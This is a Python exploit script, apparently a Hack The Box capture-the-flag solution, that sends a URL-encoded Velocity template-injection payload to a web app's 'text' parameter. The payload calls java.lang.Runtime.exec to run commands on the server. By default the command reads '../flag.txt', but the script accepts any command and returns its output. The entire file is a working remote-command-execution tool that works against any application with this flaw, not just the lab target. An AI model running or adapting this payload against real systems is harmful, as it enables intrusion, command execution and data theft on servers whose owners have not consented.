#!/usr/bin/env python3
import requests
import urllib
import sys
import re

def Main(url, command="cat ../flag.txt"):
	payload = f"""#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('{command}'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"""
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	a_payload = urllib.parse.quote(payload, safe='')

	try:
		response = requests.post(url + "/?text=" + a_payload, headers=headers)
		flag = re.search(r"HTB\{.*?\}", response.text)
		if command != "cat ../flag.txt":
			o = re.search(r'^0\s*\n(.*)', response.text, re.MULTILINE)
			return o.group(1) if o else None
		return flag.group() if flag else None
	except requests.exceptions.RequestException as e:
		print("[-] Error:", e)
		return None

if __name__ == "__main__":
	if len(sys.argv) > 3 or len(sys.argv) < 2:
		print("Usage:", sys.argv[0], "[url] [command]")
		sys.exit()

	url = sys.argv[1].rstrip("/")
	if len(sys.argv) == 3:
		command = sys.argv[2]
		print("[+] Command:", Main(url, command))
	else:
		print("[+] Flag:", Main(url))